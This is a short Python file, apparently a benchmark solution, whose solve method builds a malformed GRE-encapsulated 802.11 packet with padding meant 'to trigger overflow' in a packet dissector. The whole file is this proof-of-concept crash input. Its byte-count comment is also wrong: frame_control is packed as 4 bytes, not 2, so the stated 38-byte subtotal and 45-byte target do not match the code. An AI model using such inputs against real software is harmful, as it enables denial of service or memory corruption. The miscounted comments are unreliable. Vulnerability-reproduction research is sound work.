import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # GRE header: flags/version + protocol type for 802.11
        # Flags and version (0x2000 = checksum present, version 0)
        gre_header = struct.pack(">HH", 0x2000, 0x8200)
        
        # GRE checksum (2 bytes) - arbitrary
        gre_checksum = struct.pack(">H", 0x0000)
        
        # GRE offset (2 bytes)
        gre_offset = struct.pack(">H", 0x0000)
        
        # Construct the pseudoheader that 802.11 dissector expects
        # RadioTap header (simplified)
        # Header revision, pad, length (8 bytes), present flags
        radiotap_header = struct.pack("<BBHI", 0x00, 0x00, 0x0008, 0x00000000)
        
        # 802.11 frame (simplified)
        # Frame Control field (data frame), Duration ID
        frame_control = struct.pack("<HH", 0x0800, 0x0000)
        
        # MAC addresses (6 bytes each)
        addr1 = b"\xff\xff\xff\xff\xff\xff"  # Broadcast
        addr2 = b"\x00\x00\x00\x00\x00\x00"
        addr3 = b"\x00\x00\x00\x00\x00\x00"
        
        # Sequence control
        seq_ctrl = struct.pack("<H", 0x0000)
        
        # Payload to trigger overflow - fill remaining bytes
        # Total length needed: 45 bytes
        # Current length: gre_header(4) + checksum(2) + offset(2) + radiotap(8) + 
        #                 frame_control(2) + addr1(6) + addr2(6) + addr3(6) + seq_ctrl(2) = 38 bytes
        # Need 7 more bytes to reach 45
        payload = b"A" * 7
        
        # Combine all parts
        poc = (gre_header + gre_checksum + gre_offset + 
               radiotap_header + frame_control + 
               addr1 + addr2 + addr3 + seq_ctrl + payload)
        
        return poc